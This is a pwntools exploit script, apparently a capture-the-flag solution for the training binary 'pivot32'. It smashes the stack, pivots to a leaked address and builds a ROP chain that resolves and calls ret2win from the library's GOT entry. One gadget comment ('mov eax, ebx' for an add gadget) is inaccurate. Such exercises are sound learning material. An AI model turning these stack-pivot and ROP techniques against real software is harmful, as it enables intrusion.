from pwn import *

elf = ELF("./pivot32")
lib = ELF("./libpivot32.so")

foothold_function_addr = 0x08048520
foothold_plt_addr = elf.plt.foothold_function
foothold_got_addr = elf.got.foothold_function
ret2win_offset = (lib.sym.ret2win - lib.sym.foothold_function)

pop_eax  = 0x0804882c
pop_ebx  = 0x080484a9
call_eax = 0x080485f0
xchg_esp_eax = 0x0804882e   # xchg esp, eax
mov_eax_eax  = 0x08048830   # mov  eax, DWORD PTR [eax]
add_eax_ebx  = 0x08048833   # mov  eax, ebx

def main():
    p = elf.process()
    p.recvuntil("pivot: ")   # 文字列"pivot: "まで受けとる。

    pivot_address = int(p.recvline().strip()[0:10], 16)   # pivotするアドレス

    # stack smash
    smash_payload = b'A' * 44
    smash_payload += p32(pop_eax)
    smash_payload += p32(pivot_address)
    smash_payload += p32(xchg_esp_eax)

    # rop chain
    rop_payload = b""
    rop_payload += p32(foothold_plt_addr)
    rop_payload += p32(pop_eax)
    rop_payload += p32(foothold_got_addr)

    rop_payload += p32(mov_eax_eax)
    rop_payload += p32(pop_ebx)
    rop_payload += p32(ret2win_offset)
    rop_payload += p32(add_eax_ebx)
    rop_payload += p32(call_eax)

    # send
    p.recvuntil("> ")
    p.sendline(rop_payload)
    p.recvuntil("> ")
    p.sendline(smash_payload)

    print(p.recvall())



if __name__ == '__main__':
    main()